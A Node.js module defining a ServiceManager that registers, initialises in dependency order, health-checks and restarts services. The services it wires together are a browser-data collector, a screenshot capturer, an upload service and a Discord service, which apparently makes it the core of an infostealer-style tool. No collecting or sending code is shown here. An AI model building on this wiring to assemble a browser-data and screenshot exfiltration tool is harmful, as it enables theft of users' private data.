/**
 * Enhanced Service Manager Module
 * Manages and coordinates all application services with dependency injection
 */

const { DiscordService } = require('../services/discord/service');
const { uploadService } = require('../services/upload/service');
const { BrowserCollector } = require('../modules/browsers/collector');
const { ScreenshotCapture } = require('../modules/screenshot/capture');
const { logger } = require('./logger');
const { ErrorHandler } = require('./errors');

class ServiceManager {
    constructor() {
        this.services = new Map();
        this.dependencies = new Map();
        this.initialized = false;
        this.initializationPromise = null;
    }

    /**
     * Register a service with its dependencies
     * @param {string} name - Service name
     * @param {Function|Object} serviceFactory - Service factory or instance
     * @param {Array} dependencies - Array of dependency names
     */
    register(name, serviceFactory, dependencies = []) {
        this.dependencies.set(name, {
            factory: serviceFactory,
            deps: dependencies,
            instance: null,
            initialized: false
        });
    }

    /**
     * Initialize all services with dependency injection
     */
    async initialize() {
        if (this.initializationPromise) {
            return this.initializationPromise;
        }

        this.initializationPromise = this._doInitialize();
        return this.initializationPromise;
    }

    async _doInitialize() {
        try {
            logger.info('Initializing service manager');

            // Register core services
            this._registerCoreServices();

            // Initialize services in dependency order
            await this._initializeServices();

            this.initialized = true;
            logger.info('Service manager initialized successfully');
        } catch (error) {
            logger.error('Failed to initialize service manager', error.message);
            ErrorHandler.handle(error);
            throw error;
        }
    }

    /**
     * Register core application services
     * @private
     */
    _registerCoreServices() {
        // Register services without dependencies first
        this.register('upload', () => uploadService, []);
        this.register('screenshot', () => new ScreenshotCapture(), []);

        // Register services with dependencies
        this.register('discord', () => new DiscordService(), ['upload']);
        this.register('browserCollector', () => new BrowserCollector(), []);
    }

    /**
     * Initialize services in dependency order
     * @private
     */
    async _initializeServices() {
        const initializeService = async name => {
            const serviceDef = this.dependencies.get(name);
            if (!serviceDef || serviceDef.initialized) {
                return;
            }

            // Initialize dependencies first (sequentially to maintain order)
            // eslint-disable-next-line no-await-in-loop
            for (const depName of serviceDef.deps) {
                await initializeService(depName);
            }

            // Create service instance
            const instance =
                typeof serviceDef.factory === 'function'
                    ? serviceDef.factory()
                    : serviceDef.factory;

            // Initialize service if it has an init method
            if (instance && typeof instance.initialize === 'function') {
                await instance.initialize();
            }

            serviceDef.instance = instance;
            serviceDef.initialized = true;
            this.services.set(name, instance);

            logger.debug(`Service '${name}' initialized`);
        };

        // Initialize all registered services
        const serviceNames = Array.from(this.dependencies.keys());
        await Promise.all(serviceNames.map(name => initializeService(name)));
    }

    /**
     * Get a service by name
     * @param {string} serviceName - Name of the service
     * @returns {Object} Service instance
     */
    getService(serviceName) {
        if (!this.initialized) {
            throw new Error('Service manager not initialized');
        }

        if (!this.services.has(serviceName)) {
            throw new Error(`Service '${serviceName}' not found`);
        }

        return this.services.get(serviceName);
    }

    /**
     * Check if service is available
     * @param {string} serviceName - Name of the service
     * @returns {boolean} Service availability
     */
    hasService(serviceName) {
        return this.initialized && this.services.has(serviceName);
    }

    /**
     * Get all available services
     * @returns {Array<string>} Array of service names
     */
    getAvailableServices() {
        return Array.from(this.services.keys());
    }

    /**
     * Safely get a service (returns null if not found)
     * @param {string} serviceName - Name of the service
     * @returns {Object|null} Service instance or null
     */
    getServiceSafely(serviceName) {
        try {
            return this.getService(serviceName);
        } catch {
            return null;
        }
    }

    /**
     * Check if all services are healthy
     * @returns {Promise<Object>} Health status
     */
    async checkHealth() {
        const health = {
            overall: 'healthy',
            services: {}
        };

        const healthChecks = Array.from(this.services.entries()).map(async ([name, service]) => {
            try {
                // Check if service has a health check method
                if (typeof service.healthCheck === 'function') {
                    return [name, await service.healthCheck()];
                } else {
                    return [name, 'healthy'];
                }
            } catch (error) {
                return [name, `unhealthy: ${error.message}`];
            }
        });

        const results = await Promise.all(healthChecks);
        results.forEach(([name, status]) => {
            health.services[name] = status;
            if (status.includes('unhealthy')) {
                health.overall = 'degraded';
            }
        });

        return health;
    }

    /**
     * Cleanup all services
     */
    async cleanup() {
        try {
            logger.info('Cleaning up services');

            // Cleanup services in reverse dependency order
            const cleanupPromises = [];

            for (const [name, service] of this.services) {
                if (service && typeof service.cleanup === 'function') {
                    try {
                        const cleanupResult = service.cleanup();
                        // Handle both sync and async cleanup functions
                        if (cleanupResult && typeof cleanupResult.then === 'function') {
                            cleanupPromises.push(
                                cleanupResult.catch(error =>
                                    logger.warn(
                                        `Failed to cleanup service '${name}':`,
                                        error.message
                                    )
                                )
                            );
                        }
                    } catch (error) {
                        logger.warn(`Failed to cleanup service '${name}':`, error.message);
                    }
                }
            }

            await Promise.all(cleanupPromises);

            this.services.clear();
            this.initialized = false;
            this.initializationPromise = null;

            logger.info('Services cleanup completed');
        } catch (error) {
            logger.error('Failed to cleanup services', error.message);
        }
    }

    /**
     * Restart a specific service
     * @param {string} serviceName - Name of the service to restart
     */
    async restartService(serviceName) {
        if (!this.dependencies.has(serviceName)) {
            throw new Error(`Service '${serviceName}' not registered`);
        }

        const serviceDef = this.dependencies.get(serviceName);

        // Cleanup existing instance
        if (serviceDef.instance && typeof serviceDef.instance.cleanup === 'function') {
            await serviceDef.instance.cleanup();
        }

        // Reset state
        serviceDef.instance = null;
        serviceDef.initialized = false;
        this.services.delete(serviceName);

        // Reinitialize
        const instance =
            typeof serviceDef.factory === 'function' ? serviceDef.factory() : serviceDef.factory;

        if (instance && typeof instance.initialize === 'function') {
            await instance.initialize();
        }

        serviceDef.instance = instance;
        serviceDef.initialized = true;
        this.services.set(serviceName, instance);

        logger.info(`Service '${serviceName}' restarted`);
    }
}

// Create and export singleton instance
const serviceManager = new ServiceManager();

module.exports = {
    ServiceManager,
    serviceManager
};
